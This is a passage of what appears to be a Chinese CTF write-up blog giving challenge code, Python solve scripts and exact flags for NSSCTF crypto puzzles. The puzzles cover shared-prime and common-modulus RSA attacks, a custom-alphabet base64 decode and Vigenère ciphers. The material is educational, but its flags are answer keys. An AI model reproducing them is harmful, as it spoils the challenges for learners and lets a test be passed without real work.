False)<br>(mpz(6879417989), False)<br>(mpz(1814981430), False)<br>(mpz(555252340), False)<br>(mpz(192421706), False)<br>(mpz(74138084), False)<br>(mpz(31280773), False)<br>(mpz(14275227), False)<br>(mpz(6974518), False)<br>(mpz(3617160), False)<br>(mpz(1977120), False)<br>(mpz(1132082), False)<br>(mpz(675554), False)<br>(mpz(418271), False)<br>(mpz(267679), False)<br>(mpz(176479), False)<br>(mpz(119521), False)<br>(mpz(82942), False)<br>(mpz(58846), False)<br>(mpz(42602), False)<br>(mpz(31417), False)<br>(mpz(23563), False)<br>(mpz(17950), False)<br>(mpz(13871), False)<br>(mpz(10862), False)<br>(mpz(8610), False)<br>(mpz(6903), False)<br>(mpz(5592), False)<br>(mpz(4575), False)<br>(mpz(3778), False)<br>(mpz(3146), False)<br>(mpz(2640), False)<br>(mpz(2233), False)<br>(mpz(1901), False)<br>(mpz(1630), False)<br>(mpz(1406), False)<br>(mpz(1219), False)<br>(mpz(1063), False)<br>(mpz(932), False)<br>(mpz(821), False)<br>(mpz(727), False)<br>(mpz(646), False)<br>(mpz(577), False)<br>(mpz(517), False)<br>(mpz(465), False)<br>(mpz(420), False)<br>(mpz(380), False)<br>(mpz(345), False)<br>(mpz(315), False)<br>(mpz(287), False)<br>b’NSSCTF{because_i_like}’</p></blockquote><hr><h2 id="29-LitCTF-2023-原来你也玩原神-初级"><a href="#29-LitCTF-2023-原来你也玩原神-初级" class="headerlink" title="29 [LitCTF 2023]原来你也玩原神 (初级)"></a>29 [LitCTF 2023]原来你也玩原神 (初级)</h2><p>🚩flag：<code>NSSCTF{YUANLAINIYEWANYUANSHENWWW}</code></p><p>💡hint：<code>其他</code></p><p>题目描述:旅行者收到了一封奇怪的来信，是提瓦特大陆的语言！</p><p>我玩原神但是我看不懂）</p><p>![截屏2025-08-12 16.27.55](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-12 16.27.55.png)</p><p>最后一行，对照拉丁文。</p><p>LITCTF{YUANLAINIYEWANYUANSHENWWW}</p><p>来自一个大佬的截图：</p><p>![截屏2025-08-12 16.29.28](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-12 16.29.28.png)</p><hr><h2 id="30-AFCTF-2018-Vigenere"><a href="#30-AFCTF-2018-Vigenere" class="headerlink" title="30 [AFCTF 2018]Vigenère"></a>30 [AFCTF 2018]Vigenère</h2><p>🚩flag：<code>NSSCTF{Whooooooo_U_Gotcha!}</code></p><p>💡hint：<code>维吉尼亚</code> <code>古典密码</code> <code>字频统计</code></p><p>在线解密网站：<a href="https://www.guballa.de/vigenere-solver/">https://www.guballa.de/vigenere-solver\</a></p><p>断网工具：<a href="https://github.com/atomcated/Vigenere">https://github.com/atomcated/Vigenere</a></p><p>![截屏2025-08-12 16.32.58](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-12 16.32.58.png)</p><hr><h2 id="31-BJDCTF-2020-rsa"><a href="#31-BJDCTF-2020-rsa" class="headerlink" title="31 [BJDCTF 2020]rsa"></a>31 [BJDCTF 2020]rsa</h2><p>🚩flag：<code>NSSCTF{p_is_common_divisor}</code></p><p>💡hint：<code>共享素数</code> <code>RSA</code> <code>素数分解</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">"flag"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span>(e&lt;<span class="number">100000</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> c,n</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(<span class="number">294</span>,e,n)</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(<span class="string">"BJD"</span>*<span class="number">32</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> c,n</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line"><span class="string">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"><span class="string">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721  12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">c1 = <span class="number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span></span><br><span class="line">n1 = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">hint = <span class="number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721</span></span><br><span class="line">n2 = <span class="number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：通过共享素数攻击分解n1和n2</span></span><br><span class="line">q = gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> q != <span class="number">1</span>  <span class="comment"># 确保成功分解</span></span><br><span class="line">p1 = n1 // q</span><br><span class="line">p2 = n2 // q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：暴力枚举e（已知e &lt; 100000）</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="number">294</span>, e, n1) == hint:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"找到e = <span class="subst">{e}</span>"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"未找到正确的e"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：解密flag</span></span><br><span class="line">phi = (p1 - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, d, n1)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密结果:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>找到e = 52361<br>解密结果: b’BJD{p_is_common_divisor}’</p></blockquote><hr><h2 id="32-HDCTF-2023-Normal-Rsa"><a href="#32-HDCTF-2023-Normal-Rsa" class="headerlink" title="32 [HDCTF 2023]Normal_Rsa"></a>32 [HDCTF 2023]Normal_Rsa</h2><p>🚩flag：<code>NSSCTF{0b3663ed-67e4-44e2-aee7-7c2d8665b63c}</code></p><p>💡hint：<code>共享素数</code> <code>RSA</code> <code>素数分解</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from shin import flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=bytes_to_long(<span class="string">b'HDCTF{0b3663ed-67e4-44e2-aee7-7c2d8665b63c}'</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="comment">#q=getPrime(512)</span></span><br><span class="line">q=<span class="number">6704006258427795304220450411280948926213189680360135534636452074716135019217911134480777251273836898349926894302122011679095979445240343891749741039976761</span></span><br><span class="line">r=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q*r</span><br><span class="line">P=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">Q=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"P = <span class="subst">{P}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"Q = <span class="subst">{Q}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"n = <span class="subst">{n}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"c = <span class="subst">{c}</span>"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">P = 6773247693445539441213578786581644136043035242620265251725630106817272212428325283262417364786451280269516220237289567904055371962564710888510272312707201</span></span><br><span class="line"><span class="string">Q = 44943699913039047357456835559925378512493523252980366265686899925123157887149890185055864945749408514100461655676474535153113631214288057465776668291975220848776401405531599573114898492452990847774628035552581539370236080368457643523158920565504112005843410442573511095306233906498204203659537135943420051121</span></span><br><span class="line"><span class="string">n = 4785613888465991171479248142015453309149548888755453367991501772592797686075465426815591528773123474962122102667475893532087343900904799831474817826058951265607078893487357878501280782935653048309499430170214015422492927323961394806106719569168457890040223027119115392961801582406287167644266319898276785787730947633037300317098453409851410936140488150390919951503767522517809035474567</span></span><br><span class="line"><span class="string">c = 2247027561636791381460194811205520085150851211795956750955965051548230844233212462525163107917067768507367576366327035846089534916090521357212722275045521111077106695721780943857231570836500588468487620819893688830570842176795906808347617421353983094639290979158413935035603633331786978227439155042365130799647385116773171906670409535157184391352888875130028955334874727206292146950544</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line">P = <span class="number">6773247693445539441213578786581644136043035242620265251725630106817272212428325283262417364786451280269516220237289567904055371962564710888510272312707201</span></span><br><span class="line">Q = <span class="number">44943699913039047357456835559925378512493523252980366265686899925123157887149890185055864945749408514100461655676474535153113631214288057465776668291975220848776401405531599573114898492452990847774628035552581539370236080368457643523158920565504112005843410442573511095306233906498204203659537135943420051121</span></span><br><span class="line">n = <span class="number">4785613888465991171479248142015453309149548888755453367991501772592797686075465426815591528773123474962122102667475893532087343900904799831474817826058951265607078893487357878501280782935653048309499430170214015422492927323961394806106719569168457890040223027119115392961801582406287167644266319898276785787730947633037300317098453409851410936140488150390919951503767522517809035474567</span></span><br><span class="line">c = <span class="number">2247027561636791381460194811205520085150851211795956750955965051548230844233212462525163107917067768507367576366327035846089534916090521357212722275045521111077106695721780943857231570836500588468487620819893688830570842176795906808347617421353983094639290979158413935035603633331786978227439155042365130799647385116773171906670409535157184391352888875130028955334874727206292146950544</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gmpy2.isqrt(P)</span><br><span class="line">q = gmpy2.isqrt(Q)</span><br><span class="line">r = n // p // q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (r - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, r)</span><br><span class="line">decrypted_message = n2s(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Decrypted message:"</span>, decrypted_message)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>Decrypted message: b’HDCTF{0b3663ed-67e4-44e2-aee7-7c2d8665b63c}’</p></blockquote><hr><h2 id="33-NSSCTF-2022-Spring-Recruit-Vigenere"><a href="#33-NSSCTF-2022-Spring-Recruit-Vigenere" class="headerlink" title="33 [NSSCTF 2022 Spring Recruit]Vigenere"></a>33 [NSSCTF 2022 Spring Recruit]Vigenere</h2><p>🚩flag：<code>NSSCTF{crypto_needs_you}</code></p><p>💡hint：<code>维吉尼亚</code> <code>古典密码</code> <code>字频统计</code></p><p>在线解密网站：<a href="https://www.guballa.de/vigenere-solver/">https://www.guballa.de/vigenere-solver\</a></p><p>断网工具：<a href="https://github.com/atomcated/Vigenere">https://github.com/atomcated/Vigenere</a></p><p>![截屏2025-08-12 16.43.25](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-12 16.43.25.png)</p><blockquote><p>NSSCTF{crypto_needs_you}</p></blockquote><hr><h2 id="34-CISCN-2023-初赛-Sign-in-passwd"><a href="#34-CISCN-2023-初赛-Sign-in-passwd" class="headerlink" title="34 [CISCN 2023 初赛]Sign_in_passwd"></a>34 [CISCN 2023 初赛]Sign_in_passwd</h2><p>🚩flag：<code>NSSCTF{8e4b2888-6148-4003-b725-3ff0d93a6ee4}</code></p><p>💡hint：<code>base</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D</span><br><span class="line">GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5</span><br></pre></td></tr></tbody></table></figure><p>换表base64</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">str1 = <span class="string">"j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D"</span></span><br><span class="line">new  = <span class="string">"GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF"</span></span><br><span class="line">inti = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(new,inti))))</span><br></pre></td></tr></tbody></table></figure><blockquote><p>b’flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}’</p></blockquote><hr><h2 id="35-BJDCTF-2020-EasyRSA"><a href="#35-BJDCTF-2020-EasyRSA" class="headerlink" title="35 [BJDCTF 2020]EasyRSA"></a>35 [BJDCTF 2020]EasyRSA</h2><p>🚩flag：<code>NSSCTF{Advanced_mathematics_is_too_hard!!!}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c,z,n)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line"><span class="string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line"><span class="string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> isqrt, invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定数据</span></span><br><span class="line">c = <span class="number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line">z = <span class="number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line">n = <span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1：计算 p + q = sqrt(z + 2n)</span></span><br><span class="line">s = isqrt(z + <span class="number">2</span> * n)</span><br><span class="line"><span class="keyword">assert</span> s * s == z + <span class="number">2</span> * n  <span class="comment"># 验证是否为完全平方数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2：解方程 x² - s*x + n = 0</span></span><br><span class="line">delta = s * s - <span class="number">4</span> * n</span><br><span class="line">p = (s - isqrt(delta)) // <span class="number">2</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证 p 和 q</span></span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"><span class="keyword">assert</span> p + q == s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3：计算私钥 d</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤4：解密明文 m</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密结果:"</span>, flag)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>解密结果: b’BJD{Advanced_mathematics_is_too_hard!!!}’</p></blockquote><hr><h2 id="36-SWPUCTF-2021-新生赛-crypto1"><a href="#36-SWPUCTF-2021-新生赛-crypto1" class="headerlink" title="36 [SWPUCTF 2021 新生赛]crypto1"></a>36 [SWPUCTF 2021 新生赛]crypto1</h2><p>🚩flag：<code>NSSCTF{d64dba66-b608-4255-b888-0b0f25c2f90e}</code></p><p>💡hint：<code>RSA</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag  = <span class="string">'****************************'</span></span><br><span class="line">flag = {<span class="string">"asfajgfbiagbwe"</span>}</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">e1e2 = <span class="number">3087</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag1= '</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag2= '</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'n= '</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594</span></span><br><span class="line"><span class="comment">#flag2= 130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408</span></span><br><span class="line"><span class="comment">#n= 609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RsaSameModuleAttack</span>(<span class="params">e1, e2, c1, c2, n</span>):</span><br><span class="line">    e1, e2, c1, c2, n = <span class="built_in">int</span>(e1), <span class="built_in">int</span>(e2), <span class="built_in">int</span>(c1), <span class="built_in">int</span>(c2), <span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"i,e2:"</span>, e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(gmpy2.gcd(e1, e2))</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> 